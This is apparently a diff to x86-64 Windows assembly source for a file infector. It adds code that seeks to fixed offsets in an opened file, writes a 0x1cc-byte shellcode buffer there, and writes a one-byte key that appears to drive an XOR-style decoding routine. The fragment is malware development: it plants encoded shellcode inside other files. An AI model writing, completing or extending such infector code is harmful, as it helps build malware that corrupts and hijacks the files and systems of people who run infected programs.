@@ -110,15 +110,15 @@ found_dot:
 
 	mov r15, rax; saving handler
 
-	;SET FILE POINTER
+	;SET FILE POINTER TO WRITE SHELLCODE
 	mov rcx, rax	
 	mov rdx, 0xA9B
 	xor r8, r8
 	mov r9, 0x00;for FILE_BEGIN
 	call SetFilePointer
 
-	;WRITE FILE
-	mov rcx, rax
+	;WRITE FILE FOR SHELLCODE
+	mov rcx, r15;file handle
 	mov rdx, [rel shell_pointer]
 	mov r8, 0x1cc
 	mov r9, 0
@@ -127,9 +127,28 @@ found_dot:
 	call WriteFile
 	add rsp, 0x20
 	
+	;SET FILE POINTER FOR KEY
+	mov rcx, r15
+	mov rdx, 0xA50
+	xor r8, r8
+	mov r9, 0x00
+	call SetFilePointer
+
+	;WRITE FILE FOR KEY
+	mov rcx, r15
+	mov rdx, [rel key]
+	mov r8, 0x01
+	mov r9, 0
+	push 0
+	sub rsp, 0x20
+	call WriteFile
+	add rsp, 0x20
+
 	;CLOSE FILE
 	mov rcx, rax
 	call CloseHandle
+
+	;KEY IS A50 - need to set file pointer and write
 
 	xor bl, bl; setting flag for jump to run
 	mov al, [rel key];current key
